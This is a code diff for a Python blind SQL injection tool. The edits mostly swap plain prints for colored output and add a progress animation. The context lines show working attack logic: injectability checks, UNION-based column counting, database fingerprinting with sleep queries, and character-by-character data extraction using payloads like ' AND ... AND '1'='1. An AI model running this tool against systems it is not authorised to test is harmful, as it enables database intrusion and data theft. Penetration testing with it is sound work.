@@ -13,6 +13,9 @@ from urllib.parse import quote, parse_qs
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
+current_animation = None
+
+
 ### Constants and Usage
 
 
@@ -66,7 +69,7 @@ def load_request(file_path):
             file_content = f.read()
         return parse_request(file_content)
     except Exception as e:
-        print(f"[-] Error reading request file: {e}")
+        print_colored("!", f"Error reading request file: {e}")
         return None, None, None
 
 
@@ -76,7 +79,7 @@ def load_grams(grams_file_path):
             grams = json.load(file)
         return grams
     except Exception as e:
-        print(f"Error loading {grams_file_path}: {e}")
+        print_colored("!", f"Error loading {grams_file_path}: {e}")
         return None
 
 
@@ -88,14 +91,14 @@ def load_queries():
         with open(queries_file, 'r') as file:
             queries = json.load(file)
     except Exception as e:
-        print(f"Error loading version queries: {e}")
+        print_colored("!", f"Error loading version queries: {e}")
         queries = {}
 
     try:
         with open(sleep_file, 'r') as file:
             sl_queries = json.load(file)
     except Exception as e:
-        print(f"Error loading sleep queries: {e}")
+        print_colored("!", f"Error loading sleep queries: {e}")
         sl_queries = {}
 
     return {"queries": queries, "sl_queries": sl_queries}
@@ -106,6 +109,7 @@ def max_workers(args):
     level = args.level or 1
     workers = num_cpus * level
     return workers
+
 
 ### Info Objects
 
@@ -168,10 +172,13 @@ def is_injectable(request_info, constants, args):
     checks if the field is injectable using true, false, and error conditions. also determines the detection method.
     additionally, uses baseline requests to validate against false positives and determine the most accurate detection method.
     """
+    global current_animation
     if not (args.sleep_only or args.force):
-        print("[*] Checking if the field is injectable...")
+        current_animation = DancingDots("Checking if the field is injectable", symbol='*')
+        current_animation.start()
     else:
-        print("[*] Gathering condition info...")
+        current_animation = DancingDots("Gathering condition info", symbol='*')
+        current_animation.start()
 
     # Step 1: Baseline request
     baseline = BaselineInfo(
@@ -184,7 +191,7 @@ def is_injectable(request_info, constants, args):
             request_info=request_info, args=args
         )
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during baseline request: {e}")
+        print_colored("!", f"Error during baseline request: {e}")
         return False, None, None, None, constants, args
 
     payloads = {
@@ -232,7 +239,7 @@ def is_injectable(request_info, constants, args):
 
 
         except requests.exceptions.RequestException as e:
-            print(f"[-] Error during {condition} condition injection request: {e}")
+            print_colored("!", f"Error during {condition} condition injection request: {e}")
             return False, None, None, None, constants, args
 
     true_status_code = responses["true"]["status_code"]
@@ -246,22 +253,22 @@ def is_injectable(request_info, constants, args):
     if baseline.status_code == 200:
         if true_status_code == 200 and false_status_code != 200 and error_status_code not in [200, false_status_code]:
             if not (args.sleep_only or args.force):
-                print("[+] Status code detection (full).")
+                print_colored("+", "Status code detection (full).")
             scores["status"] += 3
             handling["status"] = "true, false, error"
         elif true_status_code == 200 and false_status_code == 200 and error_status_code != 200:
             if not (args.sleep_only or args.force):
-                print("[+] Status code detection (error-only).")
+                print_colored("+", "Status code detection (error-only).")
             scores["status"] += 2
             handling["status"] = "error"
         elif true_status_code == 200 and false_status_code == error_status_code:
             if not (args.sleep_only or args.force):
-                print("[-] Field may be injectable, but status codes will not provide accurate data.")
+                print_colored("-", "Field may be injectable, but status codes will not provide accurate data.")
         else:
             if not (args.sleep_only or args.force):
-                print("[-] Field may be injectable, but status codes will not provide accurate data.")
+                print_colored("-", "Field may be injectable, but status codes will not provide accurate data.")
     else:
-        print("[-] Malformed request, look over your input.")
+        print_colored("!", "Malformed request, look over your input.")
         return False, None, None, None, constants, args
 
     # Step 4: Content length check
@@ -271,20 +278,20 @@ def is_injectable(request_info, constants, args):
             diff(false_content_length, error_content_length)
     ):
         if not (args.sleep_only or args.force):
-            print("[+] Content length detection (full).")
+            print_colored("+", "Content length detection (full).")
         scores["content"] += 2.5
         handling["content"] = "true, false, error"
     elif not diff(true_content_length, false_content_length) and diff(false_content_length, error_content_length):
         if not (args.sleep_only or args.force):
-            print("[+] Content length detection (error-only).")
+            print_colored("+", "Content length detection (error-only).")
         scores["content"] += 1.5
         handling["content"] = "false, error"
     elif not diff(true_content_length, false_content_length) and not diff(false_content_length, error_content_length):
         if not (args.sleep_only or args.force):
-            print("[-] Field may be injectable, but content length will not provide accurate data.")
+            print_colored("!", "Field may be injectable, but content length will not provide accurate data.")
     else:
         if not (args.sleep_only or args.force):
-            print("[-] Field may be injectable, but content length will not provide accurate data.")
+            print_colored("!", "Field may be injectable, but content length will not provide accurate data.")
 
     # Step 5: Keyword check
     if args.keywords:
@@ -318,22 +325,22 @@ def is_injectable(request_info, constants, args):
             scores["keyword"] += 3
             handling["keyword"] = "true, false, error"
             if not (args.sleep_only or args.force):
-                print("[+] Keyword detection (full)")
+                print_colored("+", "Keyword detection (full)")
         elif only_false and only_error:
             scores["keyword"] += 2
             handling["keyword"] = "false, error"
             if not (args.sleep_only or args.force):
-                print("[+] Keyword detection (false, error)")
+                print_colored("+", "Keyword detection (false, error)")
         elif only_error and only_true:
             scores["keyword"] += 1
             handling["keyword"] = "true, error"
             if not (args.sleep_only or args.force):
-                print("[+] Keyword detection (true, error)")
+                print_colored("+", "Keyword detection (true, error)")
         elif only_error:
             scores["keyword"] += 1
             handling["keyword"] = "error"
             if not (args.sleep_only or args.force):
-                print("[+] Keyword detection (error only)")
+                print_colored("+", "Keyword detection (error only)")
 
     smallest_content_diff = float("inf")
     baseline_condition = None
@@ -346,7 +353,7 @@ def is_injectable(request_info, constants, args):
                 baseline_condition = condition
 
     if baseline_condition != "true":
-        print("[!] Baseline condition does not evaluate to true. Check the information you supplied. "
+        print_colored("!", "Baseline condition does not evaluate to true. Check the information you supplied. "
               "Make sure the database is receiving a known value.")
         return False, None, None, None, constants, args
 
@@ -360,22 +367,24 @@ def is_injectable(request_info, constants, args):
             method = "sleep"
             return True, baseline_condition, method, conditions, constants, args
         else:
-            print(f"[+] Using {method}-based detection with conditions: {info}.")
+            print_colored("+", f"Using {method}-based detection with conditions: {info}.")
             return True, baseline_condition, method, conditions, constants, args
     else:
-        print("[*] Fastest methods failed. Attempting sleep-based detection.")
+        print_colored("*", "Fastest methods failed. Attempting sleep-based detection.")
         args.sleep_only = 10
         args.timeout += args.sleep_only
         sleep_queries = constants.sleep_queries.get("sleep_queries", [])
         if args.verbose:
-            print(f"[VERBOSE] Using sleep detection with {len(sleep_queries)} unique sleep queries.")
+            print_colored("VERBOSE", f" Using sleep detection with {len(sleep_queries)} unique sleep queries.")
         for sleep_query in sleep_queries:
             sleep_query = sleep_query.replace('%', str(args.sleep_only))
             new_payload = f"' AND {sleep_query} AND '1'='1"
             payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=["true"])
             if args.delay > 0:
                 if args.verbose:
-                    print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                    current_animation = DancingDots(f"Delaying for {args.delay} seconds", symbol ="VERBOSE")
+                    current_animation.start()
                 time.sleep(args.delay)
 
             try:
@@ -393,15 +402,15 @@ def is_injectable(request_info, constants, args):
                     break
 
             except requests.exceptions.RequestException as e:
-                print(f"[-] Error during sleep injection request: {e}")
+                print_colored("!", f"Error during sleep injection request: {e}")
                 return False, None, None, None, constants, args
 
         if len(constants.sleep_queries["sleep_queries"]) == 1:
-            print(f"[+] Sleep query found: {constants.sleep_queries["sleep_queries"]}. Using sleep-based detection.")
+            print_colored("+", f"Sleep query found: {constants.sleep_queries["sleep_queries"]}. Using sleep-based detection.")
             method = "sleep"
             return True, baseline_condition, method, conditions, constants, args
 
-    print("[-] No significant differences detected between conditions. Field is likely not injectable.")
+    print_colored("!", "No significant differences detected between conditions. Field is likely not injectable.")
     return False, None, None, None, constants, args
 
 
@@ -409,8 +418,9 @@ def column_count(request_info, db_info, constants, args):
     """
     utilizes UNION SELECT statements and NULL values to match the column output of the original sql query.
     """
-
-    print("[*] Attempting to count columns...")
+    global current_animation
+    current_animation = DancingDots("Attempting to count columns", symbol='*')
+    current_animation.start()
 
     # Step 1: Baseline request
     baseline = BaselineInfo(
@@ -423,7 +433,7 @@ def column_count(request_info, db_info, constants, args):
             request_info=request_info, args=args
         )
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during baseline request: {e}")
+        print_colored("!", f"Error during baseline request: {e}")
         return
 
     # Step 2: Prepare queries
@@ -437,7 +447,7 @@ def column_count(request_info, db_info, constants, args):
             if args.sleep_only:
                 for sleep_query in sleep_queries:
                     if not sleep_query or sleep_query == "N/A":
-                        print(f"[-] Invalid or unavailable sleep query. Skipping...")
+                        print_colored("-", f"Invalid or unavailable sleep query. Skipping.")
                         continue
                     db_info.sleep_query = sleep_query
                     sleep_query = sleep_query.replace('%', str(args.sleep_only))
@@ -445,7 +455,9 @@ def column_count(request_info, db_info, constants, args):
                     payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                     if args.delay > 0:
                         if args.verbose:
-                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                            current_animation = DancingDots(f"Delaying for {args.delay} seconds", symbol ="VERBOSE")
+                            current_animation.start()
                         time.sleep(args.delay)
 
                     tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info,
@@ -455,7 +467,10 @@ def column_count(request_info, db_info, constants, args):
                 payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                        current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                             symbol="VERBOSE")
+                        current_animation.start()
                     time.sleep(args.delay)
 
                 tasks.append(
@@ -467,12 +482,12 @@ def column_count(request_info, db_info, constants, args):
                 result = future.result()
                 if result is True or (isinstance(result, tuple) and result[0] is True):
                     columns += 1
-                    print(f"[+] Found {columns} columns")
+                    print_colored("+", f"Found {columns} columns")
                     return columns
 
             columns += 1
 
-    print(f"[-] Unable to detect the column count.")
+    print_colored("-", f"Unable to detect the columns.")
     return None
 
 
@@ -491,7 +506,9 @@ def detect_database(request_info, db_info, constants, args):
     good enough is good enough.
     """
 
-    print("[*] Attempting to detect the database type...")
+    global current_animation
+    current_animation = DancingDots("Attempting to detect the database type", symbol='*')
+    current_animation.start()
 
     adjusted_columns = db_info.columns - 2
 
@@ -506,7 +523,7 @@ def detect_database(request_info, db_info, constants, args):
             request_info=request_info, args=args
         )
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during baseline request: {e}")
+        print_colored("!", f"Error during baseline request: {e}")
         return None, args
 
     # Step 2: Sleep-only detection
@@ -514,7 +531,7 @@ def detect_database(request_info, db_info, constants, args):
     if args.sleep_only:
         sleep_queries = constants.sleep_queries.get("sleep_queries", [])
         if args.verbose:
-            print(f"[VERBOSE] Using sleep detection with {len(sleep_queries)} unique sleep queries.")
+            print_colored("VERBOSE", f" Using sleep detection with {len(sleep_queries)} unique sleep queries.")
         with ThreadPoolExecutor(max_workers=constants.workers) as executor:
             for sleep_query in sleep_queries:
                 db_info_copy = deepcopy(db_info)
@@ -524,7 +541,10 @@ def detect_database(request_info, db_info, constants, args):
                 payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                        current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                             symbol="VERBOSE")
+                        current_animation.start()
                     time.sleep(args.delay)
 
                 tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
@@ -536,7 +556,7 @@ def detect_database(request_info, db_info, constants, args):
                 if result and result[0] is True:
                     sleep_query = result[1]
                     db_info.sleep_query = sleep_query.replace(str(args.sleep_only), '%')
-                    print(f"[+] Sleep-based detection with query {sleep_query}")
+                    print_colored("+", f"Sleep-based detection with query {sleep_query}")
                     # Step 4: Lower sleep time
                     new_sleep = lower(
                         request_info=request_info, db_info=db_info,
@@ -546,7 +566,7 @@ def detect_database(request_info, db_info, constants, args):
                     sleep_query = sleep_query.replace(str(args.sleep_only), str(new_sleep))
                     args.sleep_only = new_sleep
                     # Step 5: Check version queries
-                    print(f"[*] Checking associated version queries")
+                    print_colored("*", f"Checking associated version queries")
                     version_tasks = []
                     with ThreadPoolExecutor(max_workers=constants.workers) as version_executor:
                         for db_name, queries in constants.queries.items():
@@ -572,7 +592,10 @@ def detect_database(request_info, db_info, constants, args):
                                     payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                                     if args.delay > 0:
                                         if args.verbose:
-                                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                                            current_animation = DancingDots(
+                                                f"Delaying for {args.delay} seconds", symbol="VERBOSE")
+                                            current_animation.start()
                                         time.sleep(args.delay)
 
                                 version_tasks.append(
@@ -584,11 +607,11 @@ def detect_database(request_info, db_info, constants, args):
                             result = version_future.result()
                             if result:
                                 db_info = result
-                                print(f"[+] Database confirmed: {db_info.db_specific if db_info.db_specific else db_info.db_name}")
+                                print_colored("+", f"Database confirmed: {db_info.db_specific if db_info.db_specific else db_info.db_name}")
                                 db_info.sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                 return db_info, args
 
-                    print(f"[-] No database confirmed with version queries.")
+                    print_colored("!", f"No database confirmed with version queries.")
                     return None, args
 
     else:
@@ -604,7 +627,10 @@ def detect_database(request_info, db_info, constants, args):
                 payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                        current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                             symbol="VERBOSE")
+                        current_animation.start()
                     time.sleep(5)
 
                 tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
@@ -615,11 +641,13 @@ def detect_database(request_info, db_info, constants, args):
                 result = future.result()
                 if result is not None:
                     db_info = result
-                    print(f"[+] Database detected: {db_info.db_name}")
+                    print_colored("+", f"Database detected: {db_info.db_name}")
                     sleep_function = constants.queries[db_info.db_name].get("sleep_query", None)
                     # Step 9: Narrow down the database if needed
                     if isinstance(sleep_function, dict):
-                        print(f"[*] Narrowing down to the specific database version...")
+
+                        current_animation = DancingDots("Narrowing down to the specific database version", symbol="*")
+                        current_animation.start()
                         args.sleep_only = 10
                         args.timeout += args.sleep_only
                         specific_tasks = []
@@ -629,15 +657,17 @@ def detect_database(request_info, db_info, constants, args):
                                 db_info_copy.db_specific = db_specific
                                 db_info_copy.sleep_query = sleep_query
                                 if not sleep_query or sleep_query == "N/A":
-                                    print(
-                                        f"[-] Sleep function for {db_info_copy.db_specific} is not applicable or not found. Skipping...")
+                                    print_colored("-", f"Sleep function for {db_info_copy.db_specific} is not applicable or not found. Skipping.")
                                     continue
                                 sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                 new_payload = f"' AND {sleep_query} AND '1'='1"
                                 payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                                 if args.delay > 0:
                                     if args.verbose:
-                                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                                        current_animation = DancingDots(
+                                            f"Delaying for {args.delay} seconds", symbol="VERBOSE")
+                                        current_animation.start()
                                     time.sleep(args.delay)
 
                                 specific_tasks.append(
@@ -650,13 +680,13 @@ def detect_database(request_info, db_info, constants, args):
                                 if specific_result is not None:
                                     args.sleep_only = None
                                     db_info = specific_result
-                                    print(f"[+] Narrowed down to specific database: {db_info.db_specific}")
+                                    print_colored("+", f"Narrowed down to specific database: {db_info.db_specific}")
                                     return db_info, args
                     else:
                         db_info.sleep_query = sleep_function
                         return db_info, args
 
-    print(f"[-] Unable to detect the database type. Exiting.")
+    print_colored("!", f"Unable to detect the database type. Exiting.")
     return None, args
 
 
@@ -667,16 +697,20 @@ def discover_length(request_info, db_info, args):
     """
 
     if not db_info.length_query or db_info.length_query == "N/A":
-        print(f"[-] Length query not found for {db_info.db_name}. Skipping data length detection.")
+        print_colored("*", f"Length query not found for {db_info.db_name}. Skipping data length detection.")
         return None
 
-    print(f"[*] Attempting to discover the length of the data for {args.table}.{args.column} using {db_info.length_query}...")
+    global current_animation
+    current_animation = DancingDots(
+        f"Attempting to discover the length of the data for {args.table}.{args.column} using {db_info.length_query}",
+        symbol='*')
+    current_animation.start()
 
     # Step 1: Baseline request for status and content length
     try:
         baseline = BaselineInfo(*baseline_request(request_info=request_info, args=args))
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during baseline request: {e}")
+        print_colored("!", f"Error during baseline request: {e}")
         return None
 
     low, high = 1, args.max_length
@@ -695,7 +729,10 @@ def discover_length(request_info, db_info, args):
 
         if args.delay > 0:
             if args.verbose:
-                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                     symbol="VERBOSE")
+                current_animation.start()
             time.sleep(args.delay)
 
         try:
@@ -712,16 +749,16 @@ def discover_length(request_info, db_info, args):
                 low = mid + 1
 
         except requests.exceptions.RequestException as e:
-            print(f"[-] Error during length discovery: {e}")
+            print_colored("!", f"Error during length discovery: {e}")
             return None
 
     # Step 4: Return
     if length_info['length']:
         length = length_info['length']
-        print(f"[+] Data length discovered: {length}")
+        print_colored("+", f"Data length discovered: {length}")
         return length
     else:
-        print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
+        print_colored("-", f"Failed to discover data length within the maximum length {args.max_length}.")
         return None
 
 
@@ -733,7 +770,9 @@ def extract_data(request_info, db_info, constants, args):
     of sample text for custom ngrams. the world is your oyster.
     """
 
-    print("[*] Attempting to extract data...")
+    global current_animation
+    current_animation = DancingDots("Attempting to extract data", symbol='*')
+    current_animation.start()
 
     extracted_data = ""
     wordlist = None
@@ -745,9 +784,9 @@ def extract_data(request_info, db_info, constants, args):
             with open(args.dictionary_attack, 'r') as wordlist_file:
                 wordlist = [line.strip() for line in wordlist_file.readlines()]
             if args.verbose:
-                print(f"[VERBOSE] Loaded {len(wordlist)} lines from dictionary file.")
+                print_colored("VERBOSE", f" Loaded {len(wordlist)} lines from dictionary file.")
         except Exception as e:
-            print(f"[-] Error loading wordlist: {e}")
+            print_colored("!", f"Error loading wordlist: {e}")
             return None
 
     # Step 1: Baseline request
@@ -761,7 +800,7 @@ def extract_data(request_info, db_info, constants, args):
             request_info=request_info, args=args
         )
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during baseline request: {e}")
+        print_colored("!", f"Error during baseline request: {e}")
         return
 
     # Binary search override (not threaded)
@@ -796,7 +835,10 @@ def extract_data(request_info, db_info, constants, args):
 
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                        current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                             symbol="VERBOSE")
+                        current_animation.start()
                     time.sleep(args.delay)
 
                 result = extract(
@@ -807,7 +849,7 @@ def extract_data(request_info, db_info, constants, args):
 
                 if result and operator == "=":
                     extracted_data += chr(mid)
-                    print(f"[+] Value found {chr(mid)} at position {position}")
+                    print_colored("+", f"Value found {chr(mid)} at position {position}")
                     found_match = True
                     position += 1
                     break
@@ -820,12 +862,12 @@ def extract_data(request_info, db_info, constants, args):
 
             if 32 <= low <= 126 and not found_match:
                 extracted_data += chr(low)
-                print(f"[+] Value found {chr(low)} at position {position}")
+                print_colored("+", f"Value found {chr(low)} at position {position}")
                 found_match = True
                 position += 1
 
             if not found_match:
-                print(f"[*] No match found at position {position}. Stopping extraction.")
+                print_colored("*", f"No match found at position {position}. Stopping extraction.")
                 break
 
     # Step 2: Iterate over possible values
@@ -857,7 +899,10 @@ def extract_data(request_info, db_info, constants, args):
                                       conditions=[db_info.baseline_condition, "false"])
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                        current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                             symbol="VERBOSE")
+                        current_animation.start()
                     time.sleep(args.delay)
 
                 tasks.append(executor.submit(extract, payload=payload, value=value, request_info=request_info,
@@ -867,7 +912,7 @@ def extract_data(request_info, db_info, constants, args):
                 result = future.result()
                 if result:
                     extracted_data += result
-                    print(f"[+] Value found {result} at position {position}")
+                    print_colored("+", f"Value found {result} at position {position}")
                     position += len(result)
                     found_match = True
                     break
@@ -876,7 +921,7 @@ def extract_data(request_info, db_info, constants, args):
             if wordlist:
                 if spent() or spent_switch:
                     spent_switch = True
-                    print(f"[*] Extracting single character at position {position} using binary search.")
+                    print_colored("*", f"Extracting single character at position {position} using binary search.")
                     low, high = 32, 126
                     found_match = False
 
@@ -907,7 +952,10 @@ def extract_data(request_info, db_info, constants, args):
 
                         if args.delay > 0:
                             if args.verbose:
-                                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                                current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                                     symbol="VERBOSE")
+                                current_animation.start()
                             time.sleep(args.delay)
 
                         result = extract(
@@ -917,7 +965,7 @@ def extract_data(request_info, db_info, constants, args):
 
                         if result and operator == "=":
                             extracted_data += chr(mid)
-                            print(f"Exact match found: {chr(mid)} at position {position}")
+                            print_colored("+", f"Value Found: {chr(mid)} at position {position}")
                             found_match = True
                             position += 1
                             break
@@ -930,22 +978,80 @@ def extract_data(request_info, db_info, constants, args):
 
                     if 32 <= low <= 126:
                         extracted_data += chr(low)
-                        print(f"[+] Value found {chr(low)} at position {position}")
+                        print_colored("+", f"Value found {chr(low)} at position {position}")
                         found_match = True
                         position += 1
                         continue
                     else:
-                        print(f"[*] No valid match found at position {position}. Stopping extraction.")
+                        print_colored("*", f"No valid match found at position {position}. Stopping extraction.")
                         break
 
             else:
-                print(f"[*] No match found at position {position}. Stopping extraction.")
+                print_colored("*", f"No match found at position {position}. Stopping extraction.")
                 break
 
     return extracted_data
 
 
-### Prompts
+### Prompts and Fun Stuff (:
+
+
+class DancingDots:
+    def __init__(self, message, symbol='*'):
+        self.message = message
+        self.symbol = symbol
+        self.stop_animation = threading.Event()
+        self.thread = threading.Thread(target=self.animate)
+        self.color_codes = {
+            '+': '\033[92m',   # Green
+            '!': '\033[91m',   # Red
+            '*': '\033[93m',   # Yellow
+            '-': '',           # Default color
+            'VERBOSE': '',     # Default color
+        }
+        self.reset_code = '\033[0m'
+        self.color = self.color_codes.get(symbol, '')
+
+    def start(self):
+        sys.stdout.write(f"{self.color}[{self.symbol}]{self.reset_code} {self.message}")
+        sys.stdout.flush()
+        self.thread.start()
+
+    def animate(self):
+        while not self.stop_animation.is_set():
+            for dots in ['   ', '.  ', '.. ', '...']:
+                if self.stop_animation.is_set():
+                    break
+                sys.stdout.write(f'\r{self.color}[{self.symbol}]{self.reset_code} {self.message}{dots}')
+                sys.stdout.flush()
+                time.sleep(0.5)
+        sys.stdout.write(f'\r{self.color}[{self.symbol}]{self.reset_code} {self.message}   \n')
+        sys.stdout.flush()
+
+    def stop(self):
+        self.stop_animation.set()
+        self.thread.join()
+
+
+def begone_dancing_dots():
+    global current_animation
+    if current_animation:
+        current_animation.stop()
+        current_animation = None
+
+
+def print_colored(symbol, message):
+    color_codes = {
+        '+': '\033[92m',   # Green
+        '!': '\033[91m',   # Red
+        '*': '\033[93m',   # Yellow
+        '-': '',           # Default color
+        'VERBOSE': '',     # Default color
+    }
+    reset_code = '\033[0m'
+    color = color_codes.get(symbol, '')
+    begone_dancing_dots()
+    print(f"{color}[{symbol}]{reset_code} {message}")
 
 
 class InputThread(threading.Thread):
@@ -968,6 +1074,7 @@ def input_with_timeout(timeout):
 
 
 def no_length():
+    begone_dancing_dots()
     print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
           end='', flush=True)
     user_input = input_with_timeout(20)
@@ -976,27 +1083,29 @@ def no_length():
     elif user_input == 'n':
         return False
     else:
-        print("\n[*] No input received. Proceeding with extraction anyway.")
+        print("\n[-] No input received. Proceeding with extraction anyway.")
         return True
 
 
 def one_third():
+    begone_dancing_dots()
     print(
-        "\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
-    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
+        "\n[-] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist. "
+        "\n[-] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
     user_input = input_with_timeout(20)
     if user_input == 'y':
         return True
     elif user_input == 'n':
         return False
     else:
-        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+        print("[-] No input received. Fallback to character extraction will proceed automatically.")
         return True
 
 
 def spent():
+    begone_dancing_dots()
     print(
-        "\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ",
+        "\n[-] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ",
         end='', flush=True)
     user_input = input_with_timeout(20)
     if user_input == 'y':
@@ -1004,7 +1113,7 @@ def spent():
     elif user_input == 'n':
         return False
     else:
-        print("\n[*] No input received. Proceeding with character extraction automatically.")
+        print("[-] No input received. Proceeding with character extraction automatically.")
         return True
 
 
@@ -1047,66 +1156,6 @@ def parse_request(file_content):
     return request_line, headers, body
 
 
-def prioritize_characters(extracted_chars, grams, position, length):
-    """
-    prioritizes characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
-    handles first and last characters of the data to be extracted as special cases.
-    fallback to general frequency-based prioritization if no match is found in the n-grams.
-    """
-    n = len(extracted_chars)
-    CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
-    quadgram_probs = trigram_probs = bigram_probs = {}
-    quadgram_total = trigram_total = bigram_total = 0
-
-    if position == 1:
-        char_probabilities = grams.get("starting_chars", {})
-        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
-        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
-
-    elif position == length - 1:
-        char_probabilities = grams.get("ending_chars", {})
-        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
-        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
-
-    else:
-        if n >= 3:
-            quad_key = extracted_chars[-3:]
-            quadgram_probs = {k: v for k, v in grams.get("quadgrams", {}).items() if k.startswith(quad_key)}
-            quadgram_total = sum(quadgram_probs.values())
-
-        if n >= 2:
-            trigram_key = extracted_chars[-2:]
-            trigram_probs = {k: v for k, v in grams.get("trigrams", {}).items() if k.startswith(trigram_key)}
-            trigram_total = sum(trigram_probs.values())
-
-        if n >= 1:
-            bigram_key = extracted_chars[-1:]
-            bigram_probs = {k: v for k, v in grams.get("bigrams", {}).items() if k.startswith(bigram_key)}
-            bigram_total = sum(bigram_probs.values())
-
-        if quadgram_total > trigram_total and quadgram_total > bigram_total:
-            sorted_chars = sorted(set(k[3] for k in quadgram_probs.keys()),
-                                  key=lambda k: -quadgram_probs.get(quad_key + k, 0))
-            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
-
-        elif trigram_total > bigram_total:
-            sorted_chars = sorted(set(k[2] for k in trigram_probs.keys()),
-                                  key=lambda k: -trigram_probs.get(trigram_key + k, 0))
-            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
-
-        elif bigram_total > 0:
-            sorted_chars = sorted(set(k[1] for k in bigram_probs.keys()),
-                                  key=lambda k: -bigram_probs.get(bigram_key + k, 0))
-            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
-
-        char_probabilities = grams.get("characters", {})
-        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
-        all_chars = set(sorted_chars)
-        missing_chars = [char for char in CHARSET if char not in all_chars]
-
-        return sorted_chars + missing_chars
-
-
 def send_request(request_line=None, headers=None, body=None, args=None):
     """
     sends the requests when a request template is provided, all http methods are supported.
@@ -1136,7 +1185,7 @@ def send_request(request_line=None, headers=None, body=None, args=None):
             response = requests.options(url=fully_qualified_url, headers=headers, timeout=args.timeout)
         return response
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during {method} request: {e}")
+        print_colored("!", f"Error during {method} request: {e}")
         return None
 
 
@@ -1163,8 +1212,8 @@ def baseline_request(request_info, args):
     response_time = end_time - start_time
 
     if args.verbose:
-        print(f"[VERBOSE] Baseline response status: {status_code}, content length: {content_length}")
-        print(f"[VERBOSE] Response time: {response_time} seconds")
+        print_colored("VERBOSE", f" Baseline response status: {status_code}, content length: {content_length}")
+        print_colored("VERBOSE", f" Response time: {response_time} seconds")
 
     return response, status_code, content_length
 
@@ -1222,15 +1271,15 @@ def inject(payload, request_info, args):
         response_time = end_time - start_time
 
         if args.verbose:
-            print(f"[VERBOSE] Sent request with payload: {payload.payload}")
-            print(f"[VERBOSE] Encoded: {payload.encoded}")
-            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
-            print(f"[VERBOSE] Request time: {response_time} seconds")
+            print_colored("VERBOSE", f" Sent request with payload: {payload.payload}")
+            print_colored("VERBOSE", f" Encoded: {payload.encoded}")
+            print_colored("VERBOSE", f" Response status: {response.status_code}, length: {len(response.text)}")
+            print_colored("VERBOSE", f" Request time: {response_time} seconds")
 
         return response, response_time
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during request: {e}")
+        print_colored("!", f"Error during request: {e}")
         return None, None
 
 
@@ -1275,7 +1324,9 @@ def threshold_type(request_info, args, constants):
     pairwise differences between condition averages and response length variance.
     returns the threshold type and average variance across conditions.
     """
-    print("[*] Determining optimal threshold type for content length...")
+    global current_animation
+    current_animation = DancingDots("Determining optimal threshold type for content length", symbol='*')
+    current_animation.start()
 
     # Step 1: Baseline requests
     try:
